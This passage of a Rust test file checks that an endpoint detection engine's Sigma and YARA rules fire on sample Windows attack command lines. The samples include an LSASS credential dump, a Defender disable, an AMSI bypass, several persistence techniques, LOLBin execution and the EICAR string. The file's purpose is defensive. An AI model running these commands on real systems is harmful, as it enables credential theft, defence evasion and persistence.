        "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 580 C:\\Windows\\Temp\\lsass.dmp full",
    ));
    assert!(out
        .temporal_hits
        .iter()
        .any(|hit| hit == "windows_lsass_access_dump"));
}

#[test]
fn repo_default_yara_bundle_keeps_eicar_yara_hits_on_exact_ioc() {
    let mut engine = DetectionEngine::default_with_rules();
    engine.layer1.load_hashes([
        "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f".to_string(),
    ]);
    engine
        .load_yara_rules_str(&repo_rule("rules/yara/default.yar"))
        .expect("compile repo default yara bundle");

    let dir = temp_dir("eguard-repo-eicar");
    let file = dir.join("eicar.com");
    std::fs::write(
        &file,
        b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*",
    )
    .expect("write eicar file");

    let event = TelemetryEvent {
        ts_unix: 1_700_000_001,
        event_class: EventClass::FileOpen,
        pid: 7331,
        ppid: 1,
        uid: 1000,
        process: "bash".to_string(),
        parent_process: "sshd".to_string(),
        session_id: 7331,
        file_path: Some(file.display().to_string()),
        file_write: false,
        file_hash: Some(
            "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f".to_string(),
        ),
        dst_port: None,
        dst_ip: None,
        dst_domain: None,
        command_line: None,
        event_size: None,
        container_runtime: None,
        container_id: None,
        container_escape: false,
        container_privileged: false,
    };

    let out = engine.process_event(&event);
    assert_eq!(out.confidence, detection::Confidence::Definite);
    assert!(out.signals.z1_exact_ioc);
    assert!(out.signals.yara_hit);
    assert!(out
        .yara_hits
        .iter()
        .any(|hit| hit.rule_name == "eguard_eicar_test_file"));

    let _ = std::fs::remove_dir_all(dir);
}

#[test]
fn repo_windows_defender_disable_rule_matches_set_mppreference_shape() {
    let mut engine = DetectionEngine::default_with_rules();
    engine
        .load_sigma_rule_yaml(&repo_rule("rules/sigma/windows_defender_disable.yml"))
        .expect("compile repo windows defender disable rule");

    let out = engine.process_event(&repo_windows_event(
        "powershell.exe",
        "cmd.exe",
        "powershell.exe -nop -c Set-MpPreference -DisableRealtimeMonitoring $true",
    ));
    assert!(out
        .temporal_hits
        .iter()
        .any(|hit| hit == "windows_defender_disable"));
}

#[test]
fn repo_windows_amsi_bypass_rule_matches_amsiinitfailed_shape() {
    let mut engine = DetectionEngine::default_with_rules();
    engine
        .load_sigma_rule_yaml(&repo_rule("rules/sigma/windows_amsi_bypass_reflection.yml"))
        .expect("compile repo windows amsi bypass rule");

    let out = engine.process_event(&repo_windows_event(
        "powershell.exe",
        "cmd.exe",
        "powershell.exe -c [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
    ));
    assert!(out
        .temporal_hits
        .iter()
        .any(|hit| hit == "windows_amsi_bypass_reflection"));
}

#[test]
fn repo_windows_wmi_persistence_rule_matches_root_subscription_shape() {
    let mut engine = DetectionEngine::default_with_rules();
    engine
        .load_sigma_rule_yaml(&repo_rule(
            "rules/sigma/windows_wmi_event_subscription_persistence.yml",
        ))
        .expect("compile repo windows wmi persistence rule");

    let out = engine.process_event(&repo_windows_event(
        "powershell.exe",
        "cmd.exe",
        "powershell.exe New-CimInstance -Namespace root\\subscription -ClassName CommandLineEventConsumer",
    ));
    assert!(out
        .temporal_hits
        .iter()
        .any(|hit| hit == "windows_wmi_event_subscription_persistence"));
}

#[test]
fn repo_windows_ifeo_rule_matches_sethc_debugger_shape() {
    let mut engine = DetectionEngine::default_with_rules();
    engine
        .load_sigma_rule_yaml(&repo_rule(
            "rules/sigma/windows_ifeo_debugger_persistence.yml",
        ))
        .expect("compile repo windows ifeo rule");

    let out = engine.process_event(&repo_windows_event(
        "reg.exe",
        "cmd.exe",
        "reg.exe add HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe /v Debugger /d cmd.exe /f",
    ));
    assert!(out
        .temporal_hits
        .iter()
        .any(|hit| hit == "windows_ifeo_debugger_persistence"));
}

#[test]
fn repo_windows_bits_rule_matches_notifycmdline_shape() {
    let mut engine = DetectionEngine::default_with_rules();
    engine
        .load_sigma_rule_yaml(&repo_rule(
            "rules/sigma/windows_bits_notifycmdline_persistence.yml",
        ))
        .expect("compile repo windows bits rule");

    let out = engine.process_event(&repo_windows_event(
        "bitsadmin.exe",
        "cmd.exe",
        "bitsadmin.exe /SetNotifyCmdLine EguardJob C:\\Windows\\System32\\cmd.exe /c calc.exe",
    ));
    assert!(out
        .temporal_hits
        .iter()
        .any(|hit| hit == "windows_bits_notifycmdline_persistence"));
}

#[test]
fn repo_windows_certutil_encode_rule_matches_shape() {
    let mut engine = DetectionEngine::default_with_rules();
    engine
        .load_sigma_rule_yaml(&repo_rule("rules/sigma/windows_certutil_encode.yml"))
        .expect("compile repo windows certutil encode rule");

    let out = engine.process_event(&repo_windows_event(
        "certutil.exe",
        "cmd.exe",
        "certutil.exe -encode C:\\Temp\\input.bin C:\\Temp\\output.txt",
    ));
    assert!(out
        .temporal_hits
        .iter()
        .any(|hit| hit == "windows_certutil_encode"));
}

#[test]
fn repo_windows_taskkill_tamper_rule_matches_force_kill_shape() {
    let mut engine = DetectionEngine::default_with_rules();
    engine
        .load_sigma_rule_yaml(&repo_rule("rules/sigma/windows_taskkill_eguard_tamper.yml"))
        .expect("compile repo windows taskkill tamper rule");

    let out = engine.process_event(&repo_windows_event(
        "taskkill.exe",
        "cmd.exe",
        "taskkill.exe /f /im eguard-agent.exe",
    ));
    assert!(out
        .temporal_hits
        .iter()
        .any(|hit| hit == "windows_taskkill_eguard_tamper"));
}

#[test]
fn repo_windows_com_hijack_rule_matches_inprocserver32_shape() {
    let mut engine = DetectionEngine::default_with_rules();
    engine
        .load_sigma_rule_yaml(&repo_rule("rules/sigma/windows_com_hijack_registry.yml"))
        .expect("compile repo windows com hijack rule");

    let out = engine.process_event(&repo_windows_event(
        "reg.exe",
        "cmd.exe",
        "reg.exe add HKCU\\Software\\Classes\\CLSID\\{11111111-1111-1111-1111-111111111111}\\InprocServer32 /ve /d C:\\Temp\\evil.dll /f",
    ));
    assert!(out
        .temporal_hits
        .iter()
        .any(|hit| hit == "windows_com_hijack_registry"));
}

#[test]
fn repo_windows_msbuild_rule_matches_project_shape() {
    let mut engine = DetectionEngine::default_with_rules();
    engine
        .load_sigma_rule_yaml(&repo_rule("rules/sigma/windows_msbuild_lolbin.yml"))
        .expect("compile repo windows msbuild rule");

    let out = engine.process_event(&repo_windows_event(
        "msbuild.exe",
        "cmd.exe",
        "MSBuild.exe C:\\Users\\Public\\payload.csproj",
    ));
    assert!(out
        .temporal_hits
        .iter()
        .any(|hit| hit == "windows_msbuild_lolbin"));
}

#[test]
fn repo_windows_installutil_rule_matches_shape() {
    let mut engine = DetectionEngine::default_with_rules();
    engine
        .load_sigma_rule_yaml(&repo_rule("rules/sigma/windows_installutil_lolbin.yml"))
        .expect("compile repo windows installutil rule");

    let out = engine.process_event(&repo_windows_event(
        "installutil.exe",
        "cmd.exe",
        "InstallUtil.exe /logfile= /u C:\\Users\\Public\\payload.dll",
    ));
    assert!(out
        .temporal_hits
        .iter()
        .any(|hit| hit == "windows_installutil_lolbin"));
}

#[test]
fn repo_windows_csc_rule_matches_shape() {
    let mut engine = DetectionEngine::default_with_rules();
    engine
        .load_sigma_rule_yaml(&repo_rule("rules/sigma/windows_csc_lolbin.yml"))
        .expect("compile repo windows csc rule");

    let out = engine.process_event(&repo_windows_event(
        "csc.exe",
        "cmd.exe",
        "csc.exe /out:C:\\Users\\Public\\payload.exe C:\\Users\\Public\\payload.cs",
    ));
    assert!(out
        .temporal_hits
        .iter()
        .any(|hit| hit == "windows_csc_lolbin"));
}
